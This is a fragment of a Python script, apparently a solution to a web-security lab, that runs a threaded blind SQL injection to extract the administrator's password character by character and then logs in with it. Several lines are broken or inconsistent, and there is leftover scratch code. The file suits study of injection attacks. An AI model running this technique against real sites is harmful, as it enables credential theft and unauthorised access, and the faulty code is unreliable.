"""
    
def determine_response_length(inner_query, url, no_proxy=False):
    log.info("Determining response length.")
    sess = requests.Session()
    for i in range(1, MAX_LENGTH):
        outer_query = format_length_query(inner_query, i)
        prepped = format_request(url, outer_query)
        if no_proxy:
            resp = sess.send(prepped)
        else: 
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            response_length = i
            log.info(f"length of query response is {response_length}")
            return i
       
        
def determine_response_char(task):
    sess = requests.Session()
    chars = [ord(x) for x in AVAIL_CHARS]
    for x in chars:
        outer_query = format_char_query(task["inner_query"], task["position"], x)
        prepped = format_request(task["url"], outer_query)
        if task["no_proxy"]:
            resp = sess.send(prepped)
        else:
            resp = sess.send(prepped, proxies=utils.PROXIES, verify=False)
        if is_true(resp):
            task["result"] = str(chr(x))
            return task


def format_results(response_chars):
    results = [
        res["result"]
        for res in sorted(response_chars, key=lambda item: item["position"])
    ]
    return "".join(results)

def get_response_string(inner_query, url, no_proxy, num_threads):
    response_length = determine_response_length(inner_query, url, no_proxy)
    if response_length is None:
        log.error("Couldn't determine response length.")
        sys.exit()
    if num_threads > response_length:
        numb_threads = response_length
    tasks = []
    for i in range(1, response_length + 1):
        result = {
            "position": i,
            "url": url,
            "no_proxy": no_proxy,
            "inner_query": inner_query,
        }
        tasks.append(result)
    response_chars = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        result = [executor.submit(determine_response_char, task) for task in tasks]
        for f in concurrent.futuresas_completed(results):
            response_chars.append(f.result())
    return format_results(response_chars)

def main(args):
    num_threads = 8
    sess = requests.Session()
    shop = Shop(args.url, args.no_proxy, sess)
    inner_query = "SELECT password from users where username='administrator'"
    response_string = get_response_string(
        inner_query, shop.base_url, shop.no_proxy, num_threads
    )    
    log.info(f"response is: {response_string}")
    shop.login("administrator", response_string)
    shop.is_solved()
        
        
if __name__ == "__main__":
    args = utils.parse_args(sys.argv)
    main(args)
    
"""






"""
inner_query = "SELECT 'aaaa'"
    response_length = determine_response_length(
        inner_query, shop.base_url, shop.no_proxy
    )
    get    
    print(response_length)
    print(determine_response_char(inner_query, 1, shop.base_url))
    #here
    # """
    
   
     
"""            
#    response_lenght = determine_response_length(inner_query, url, no_proxy)
#    for i in range(1, response_lenght + 1):
#        response_chars.append(determine_response_char(inner_query, i, url, no_proxy))
#    return "".join(response_chars)

"""